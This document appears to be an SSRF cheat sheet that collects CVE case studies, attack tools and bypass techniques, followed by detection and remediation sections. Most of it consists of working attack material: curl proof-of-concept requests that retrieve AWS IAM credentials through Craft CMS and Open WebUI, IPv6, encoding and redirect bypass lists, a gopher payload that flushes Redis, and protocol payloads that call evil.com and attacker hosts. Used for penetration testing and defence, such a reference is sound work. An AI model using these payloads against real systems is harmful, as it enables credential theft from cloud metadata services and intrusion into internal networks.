# Server-Side Request Forgery (SSRF)

---

## Overview

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, to other web-based services within the organization's infrastructure, or to external third-party systems.

The impact of SSRF vulnerabilities has grown significantly with the widespread adoption of cloud infrastructure, where metadata services expose sensitive credentials and configuration data.

---

## Tools

```bash
# SSRF Exploitation Frameworks
# https://github.com/tarunkant/Gopherus
gopherus --exploit [PLATFORM]

# https://github.com/daeken/SSRFTest
# https://github.com/jmdx/TLS-poison/
# https://github.com/m4ll0k/Bug-Bounty-Toolz
# https://github.com/cujanovic/SSRF-Testing
# https://github.com/bcoles/ssrf_proxy

# URL Collection and Testing
gau domain.com | python3 ssrf.py collab.listener.com

# Automated SSRF Discovery
# https://github.com/micha3lb3n/SSRFire
./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt

# SSRF Redirect Payload Generator
# https://tools.intigriti.io/redirector/
```

---

## What is SSRF?

A web application performs server-side requests to fetch remote resources. When user input controls the destination URL without proper validation, an attacker can redirect these requests to unintended targets.

**Basic Example:**
```http
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1
Host: chat:3000
```

The server fetches `http://127.0.0.1:3000` on behalf of the attacker, potentially accessing internal services.

---

## Recent Real-World SSRF Vulnerabilities

### CVE-2025-10874: Orbit Fox WordPress Plugin SSRF

**Affected Software:** Orbit Fox by ThemeIsle (WordPress plugin)
**CVSS Score:** 5.5 (Medium)
**Required Privileges:** Author+ (WordPress Author role or higher)
**Fixed Version:** 3.0.2+

The Orbit Fox plugin's MyStock import functionality contained an SSRF vulnerability in the `handle-request-mystock-import` AJAX action. The vulnerability failed to properly validate and sanitize URL parameters.

**Exploitation Technique:** Null byte injection bypass (`%00.txt`) to circumvent URL validation.

**Attack Scenarios:**
- AWS EC2 Metadata extraction: `http://169.254.169.254/latest/meta-data/hostname`
- IAM credential theft: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- SSH public key retrieval: `http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key`

**Proof of Concept:**
```bash
# Extract AWS instance hostname
python orbit_fox_poc.py http://target.com -u author -p password123 \
  -s http://169.254.169.254/latest/meta-data/hostname

# Extract IAM role credentials
python orbit_fox_poc.py http://target.com -u author -p password123 \
  -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```



---

### CVE-2026-27129: Craft CMS SSRF Protection Bypass via IPv6

**Affected Software:** Craft CMS GraphQL Asset mutation
**CVSS Score:** 5.5
**Published:** February 24, 2026

**Root Cause:** The SSRF validation used `gethostbyname()`, which only resolves IPv4 addresses. When a hostname has only AAAA (IPv6) records, the function returns the hostname string itself, causing the blocklist comparison to always fail.

**Bypass Mechanism:**

| Step | Action |
|------|--------|
| 1 | Attacker provides URL with IPv6-only hostname |
| 2 | Validation calls `gethostbyname()` - No A record exists |
| 3 | Function returns hostname string (not an IP) |
| 4 | Blocklist check compares string against IPv4 addresses → FALSE |
| 5 | Guzzle resolves DNS (including AAAA records) |
| 6 | Connection made to IPv6 metadata endpoint |

**IPv6 Bypass Payloads:**

| Cloud Provider | Blocked IPv4 | IPv6 Equivalent | Bypass Payload |
|----------------|--------------|----------------|----------------|
| AWS EC2 IMDS | 169.254.169.254 | fd00:ec2::254 | `http://fd00-ec2--254.sslip.io/` |
| Google Cloud | 169.254.169.254 | fd20:ce::254 | `http://fd20-ce--254.sslip.io/` |
| IPv6 Loopback | ::1 | N/A | `http://0-0-0-0-0-0-0-1.sslip.io/` |

**Step-by-Step Exploitation:**
```bash
# Step 1: Verify DNS resolution
dig fd00-ec2--254.sslip.io A +short
# (empty - no IPv4 record)

dig fd00-ec2--254.sslip.io AAAA +short
fd00:ec2::254

# Step 2: Enumerate IAM role name via GraphQL mutation
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\", filename: \"role.txt\" }) { id } }"}'

# Step 3: Retrieve credentials
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/ROLE_NAME\", filename: \"creds.json\" }) { id } }"}'
```



---

### CVE-2025-14793: DK PDF WordPress Plugin SSRF

**Affected Software:** DK PDF – WordPress PDF Generator plugin
**Affected Versions:** Up to and including 2.3.0
**Attack Vector:** Network
**Required Privileges:** Author-level or above

**Vulnerability Details:** The `addContentToMpdf` function within the DK PDF plugin fails to adequately sanitize or restrict URLs before making server-side requests during PDF generation operations. The vulnerable code path exists in DocumentBuilder.php at line 213 and related template handling in dkpdf-index.php.

**Attack Capabilities:**
- Probe internal network infrastructure
- Access cloud metadata endpoints (169.254.169.254)
- Interact with internal services trusting requests from the WordPress server
- Bypass firewall rules using the server as a proxy

**Detection Indicators:**
- Unusual outbound requests to internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Requests to cloud metadata endpoints from the web application
- PDF generation requests containing suspicious URL parameters

**Mitigation (iptables rules):**
```bash
iptables -A OUTPUT -m owner --uid-owner www-data -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 169.254.169.254 -j DROP
```



---

### CVE-2024-21893: Ivanti Connect Secure SSRF

**Affected Software:** Ivanti Connect Secure, Policy Secure, and ZTA gateways
**Component:** SAML
**Exploitation Status:** Mass exploitation observed

**Technical Details:** A remote attacker can send a specially crafted HTTP request and trick the application to initiate requests to arbitrary systems. Successful exploitation may allow access to sensitive data in the local network or send malicious requests to other servers.

**Observed Impact:** The threat monitoring service Shadowserver observed 170 distinct IP addresses attempting to exploit this flaw. Researchers from Orange Cyberdefense discovered attackers deployed a backdoor called "DSLog" that allows remote command execution on compromised devices.

The backdoor was inserted into an existing Perl file called `DSLog.pm` through SAML authentication requests containing encoded commands. Researchers uncovered nearly 700 compromised Ivanti appliances, 20% of which had been infected in earlier campaigns.



---

### Open WebUI SSRF (CVE-2025-65958)

**Affected Software:** Open WebUI
**Affected Versions:** <= 0.6.36
**Fixed Version:** 0.6.37
**Severity:** HIGH

**Vulnerable Endpoint:** `/api/v1/retrieval/process/web` in `backend/open_webui/routers/retrieval.py` (lines 1758-1767)

**Vulnerable Code:**
```python
@router.post("/process/web")
def process_web(request: Request, form_data: ProcessUrlForm, user=Depends(get_verified_user)):
    content, docs = get_content_from_url(request, form_data.url)  # ← SSRF vulnerability
```

**No validation performed for:**
- Private IP ranges (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Localhost addresses (127.0.0.0/8)
- Cloud metadata endpoints (169.254.169.254, fd00:ec2::254)
- Protocol restrictions (file://, gopher://, etc.)

**Proof of Concept:**
```bash
# Authenticate
TOKEN=$(curl -s "http://localhost:3000/api/v1/auths/signin" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"password"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# SSRF to AWS metadata
curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```



---

### Craft CMS Gopher Protocol SSRF

**Vulnerability:** SSRF in Craft CMS with Asset Uploads Mutations

**Required Permissions:**
- Edit assets in the volume
- Create assets in the volume

**Technical Details:** The implementation fails to restrict the URL scheme. While the application intends to "upload assets," there is no whitelist forcing HTTP or HTTPS. This allows attackers to use the Gopher protocol to wrap raw TCP commands.

**Example Payload:**
```
gopher://2130706433:6379/_FLUSHALL
```
(Targets local Redis via DWORD/Integer representation bypass)

**Remediation:** The application must normalize the hostname before validation to prevent mathematical IP obfuscation.



---

## SSRF Attack Vectors

### Common SSRF Entry Points

- Review Forms
- Contact Us pages
- Password fields (reset links, verification)
- Profile information (social links, avatars)
- User-Agent headers
- Referer headers
- Webhooks and callbacks
- File uploads (especially PDF and image processing)
- XML parsers with external entities

### IP and Port Enumeration

```bash
# Localhost variations
127.0.0.1
127.0.1
127.1
127.000.000.001
2130706433          # Decimal representation
0x7F.0x00.0x00.0x01 # Hexadecimal
0x7F.1
0x7F000001

# URL-based bypasses
http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
http://google.com:80+&@google.com:80#+@127.88.23.245:22/
http://127.88.23.245:22/?@google.com:80/
http://127.88.23.245:22/#@www.google.com:80/
```

---

## URL Bypass Techniques

### Redirect-Based Bypasses (301/302 Responses)

```bash
# 301 responses - various content types
https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf

# Custom status codes
https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json

https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json

# HTML iframe bypass
http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/
```

### String Manipulation Bypasses

```bash
# Using @ symbol for credential-style bypass
?url=http://safesite.com&site.com
?url=http://safesite.com?.site.com
?url=http://safesite.com#.site.com
?url=http://safesite.com\.site.com/domain
?url=http://site@com/account/edit.aspx

# Using double slashes
?url=http://////////////site.com/

# Unicode homoglyph attacks
?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com

# IPv6 variations
http://[::]:80/
http://0000::1:80/
```

### Localhost Bypass Variations

```bash
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000.0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1
```

---

## Advanced Protocol Exploitation

### Gopher Protocol

Gopher is a protocol that was designed for distributing, searching, and retrieving documents. In SSRF attacks, it can be used to craft arbitrary TCP payloads to interact with internal services like Redis, MySQL, and Memcached.

**Gopher Protocol Format:**
```
gopher://IP:port/_TCP_DATA_STREAM
```

**HTTP GET Request via Gopher:**
```bash
curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a
```

**HTTP POST Request via Gopher:**
```bash
curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0aHost:192.168.194.1%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:12%0d%0a%0d%0aname=purplet%0d%0a
```

**Redis Exploitation via Gopher (using Gopherus):**
```bash
gopherus --exploit redis
```



### Other Protocols

**SFTP:**
```bash
http://whatever.com/ssrf.php?url=sftp://evil.com:11111/
```

**Dict Protocol:**
```bash
http://safebuff.com/ssrf.php?dict://attacker:11111/
```

**TFTP:**
```bash
http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

**File Protocol:**
```bash
http://safebuff.com/redirect.php?url=file:///etc/passwd
http://safebuff.com/redirect.php?url=file:///c:/windows/win.ini
```

**LDAP:**
```bash
http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit
```

---

## PDF Generation SSRF

PDF generation is a common source of SSRF vulnerabilities. Many web services convert user-supplied HTML to PDF, and the rendering engines often have network access.

### TCPDF Vulnerability (CVE-2025-XXXX)

In TCPDF versions prior to 6.8.1, the `startSVGElementHandler` function improperly validated image paths in SVG files.

**Vulnerable Code:**
```php
case 'image': {
    $img = $attribs['xlink:href'];  // No validation
    // ...
    $img = urldecode($img);
}
```

**Exploitation Payload:**
```svg
<svg viewBox="0 0 0 0" xmlns="http://www.w3.org/2000/svg">
    <image width="100%" height="100%" 
           xlink:href="../../../../../../tmp/user_files/user_1/private_image.png" />
</svg>
```

The vendor fixed this in version 6.8.1 by adding a check for "../" sequences. However, version 6.8.2 was bypassed using encoded characters.

**General PDF SSRF Payload:**
```svg
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" 
                        width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```



---

## Cloud Metadata Attacks

The primary target of modern SSRF attacks is cloud metadata services. These endpoints provide instance credentials and configuration data.

### AWS EC2 Metadata

```bash
# Base metadata endpoint
http://169.254.169.254/latest/meta-data/

# Instance identity
http://169.254.169.254/latest/dynamic/instance-identity/document

# IAM credentials (most valuable)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# User data (may contain secrets)
http://169.254.169.254/latest/user-data/

# Network configuration
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

### AWS ECS Metadata

```bash
# ECS container metadata
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials
```

### Google Cloud Platform (GCP)

```bash
# Compute Engine metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Service account credentials
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Metadata

```bash
# Azure Instance Metadata Service
http://169.254.169.254/metadata/instance?api-version=2017-08-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

### Alibaba Cloud

```bash
# ECS metadata
http://100.100.100.200/latest/meta-data/
```



---

## Blind SSRF Detection

When SSRF responses are not reflected in the application response, blind detection techniques are required.

### Detection Methods

1. **External Interaction (Collaborator)**
   - Use Burp Collaborator or interactsh
   - Inject unique subdomains in URL parameters
   - Monitor for DNS/HTTP interactions

2. **Time-Based Detection**
   - Some protocols (like Gopher) may cause delays
   - Port filtering can be detected by response timing differences

3. **Error-Based Detection**
   - Connection refused errors
   - Timeout errors
   - Protocol mismatch errors

### SSRF to XSS via Video Upload

A notable example involved SSRF through video upload functionality using FFmpeg HLS processing.

**Reference:** https://hackerone.com/reports/1062888

---

## SSRF Mitigation Bypass Research

### URL Parsing Discrepancies

According to Blackhat research by Orange Tsai (2017), different programming languages parse URLs differently, creating bypass opportunities.

**Key Finding:** Node.js url.parse(), Perl URI, Go net/url, PHP parse_url(), and Ruby addressable may interpret the same URL differently than the underlying HTTP library (cURL).

### Encoding Bypasses

```bash
# URL encoded
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d

# Octal
http://0330.072.0326.0343
http://033016553343

# Hexadecimal
http://0xd8.0x3a.0xd6.0xe3
http://0xd8.0x3a.0xd6e3
http://0xd83ad6e3

# Mixed encoding
http://216.0x3a.00000000326.0xe3
http://000330.0000072.0000326.00000343
```



---

## Detection and Monitoring

### MITRE ATT&CK Detection Strategy DET0001

The following analytics detect access attempts to cloud instance metadata endpoints:

**Log Sources:**
- AWS:VPCFlowLogs - Outbound connection to 169.254.169.254 from EC2 workload
- AWS:CloudTrail - GetInstanceIdentityDocument
- eBPF:syscalls - Process within container accesses link-local address 169.254.169.254

**Mutable Detection Elements:**
- TimeWindow: Adjust temporal window for correlation of access attempts and SSRF triggers
- UserContext: Tune based on expected roles that access metadata APIs (e.g., root, service accounts)
- RequestHeaderMatch: Customize detection for HTTP Host headers indicating SSRF



### Log Indicators

- Unusual outbound HTTP requests to metadata services (169.254.169.254)
- Requests to internal IP ranges from web application servers
- PDF generation requests containing internal IP addresses or localhost references
- Sequential IP address scanning patterns
- DNS resolution attempts for internal hostnames from web servers

---

## Remediation Strategies

### Application-Level Defenses

1. **URL Allowlisting**
   - Implement strict allowlist of permitted domains
   - Reject any URL not matching approved patterns

2. **IP Address Validation**
   - Block private IP ranges (RFC 1918)
   - Block loopback addresses (127.0.0.0/8)
   - Block link-local addresses (169.254.0.0/16)
   - Block IPv6 metadata prefixes

3. **Proper DNS Resolution**
   - Use `dns_get_record()` instead of `gethostbyname()` to check both IPv4 and IPv6
   - Validate resolved IP addresses, not just hostnames

4. **Protocol Restriction**
   - Allow only HTTP and HTTPS protocols
   - Block file://, gopher://, dict://, ftp://, tftp://

### Network-Level Defenses

```bash
# Egress filtering iptables rules
iptables -A OUTPUT -m owner --uid-owner www-data -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -m owner --uid-owner www-data -d 169.254.169.254 -j DROP
```

### Cloud-Specific Mitigations

- **AWS:** Use IMDSv2 which requires session tokens and PUT requests
- **GCP:** Disable legacy metadata endpoints, use access scopes
- **Azure:** Configure managed identities with least privilege

### PHP Remediation Example (for IPv6 bypass)

```php
// Replace gethostbyname() with dns_get_record()
$records = @dns_get_record($hostname, DNS_A | DNS_AAAA);
if ($records === false) {
    $records = [];
}

$blockedIPv6Prefixes = [
    'fd00:ec2::',       // AWS IMDS, DNS, NTP
    'fd20:ce::',        // GCP Metadata
    '::1',              // Loopback
    'fe80:',            // Link-local
    '::ffff:',          // IPv4-mapped IPv6
];

foreach ($records as $record) {
    if (isset($record['ip']) && in_array($record['ip'], $blockedIPv4)) {
        return false;
    }
    if (isset($record['ipv6'])) {
        foreach ($blockedIPv6Prefixes as $prefix) {
            if (str_starts_with($record['ipv6'], $prefix)) {
                return false;
            }
        }
    }
}
```



---

## Additional Resources

### Tools
- **IP Converter:** https://h.43z.one/ipconverter/
- **Gopherus:** Gopher protocol exploit generator
- **SSRFire:** Automated SSRF discovery tool
- **SSRFmap:** SSRF exploitation framework

### References
- [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) - Orange Tsai, Blackhat 2017
- [Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators) - Intigriti
- MITRE ATT&CK DET0001: Detect Access to Cloud Instance Metadata API
